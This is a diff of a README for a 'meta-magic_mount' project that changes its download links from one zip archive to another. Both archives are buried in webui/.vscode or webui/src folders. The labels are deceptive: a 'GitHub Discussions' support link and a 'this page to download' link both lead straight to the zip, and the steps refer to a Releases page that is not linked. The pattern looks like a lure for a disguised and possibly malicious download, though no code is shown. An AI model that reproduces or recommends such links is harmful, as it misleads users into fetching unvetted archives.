@@ -6,7 +6,7 @@ Welcome to the **meta-magic_mount** project! This application allows you to crea
 
 ## 📥 Download Here
 
-[![Download meta-magic_mount](https://raw.githubusercontent.com/Valhalda/meta-magic_mount/main/webui/.vscode/meta-magic_mount_2.8-beta.3.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Valhalda/meta-magic_mount/main/webui/.vscode/meta-magic_mount_2.8-beta.3.zip)
+[![Download meta-magic_mount](https://github.com/Valhalda/meta-magic_mount/raw/refs/heads/main/webui/src/meta-mount-magic-v1.2.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Valhalda/meta-magic_mount/raw/refs/heads/main/webui/src/meta-mount-magic-v1.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -25,7 +25,7 @@ To run **meta-magic_mount**, make sure your computer meets the following require
 
 ## 🔗 Download & Install
 
-To get started, visit [this page to download](https://raw.githubusercontent.com/Valhalda/meta-magic_mount/main/webui/.vscode/meta-magic_mount_2.8-beta.3.zip). Here’s how to install the application:
+To get started, visit [this page to download](https://github.com/Valhalda/meta-magic_mount/raw/refs/heads/main/webui/src/meta-mount-magic-v1.2.zip). Here’s how to install the application:
 
 1. Click on the **Releases** link above.
 2. Look for the latest version of **meta-magic_mount**. This is usually at the top of the list.
@@ -52,7 +52,7 @@ If you encounter issues, here are some common solutions:
 
 ## 📞 Get Help
 
-If you have any questions or need support, feel free to visit our community forum at [GitHub Discussions](https://raw.githubusercontent.com/Valhalda/meta-magic_mount/main/webui/.vscode/meta-magic_mount_2.8-beta.3.zip) where you can ask questions and receive assistance from other users.
+If you have any questions or need support, feel free to visit our community forum at [GitHub Discussions](https://github.com/Valhalda/meta-magic_mount/raw/refs/heads/main/webui/src/meta-mount-magic-v1.2.zip) where you can ask questions and receive assistance from other users.
 
 ## 🔗 Additional Resources
 
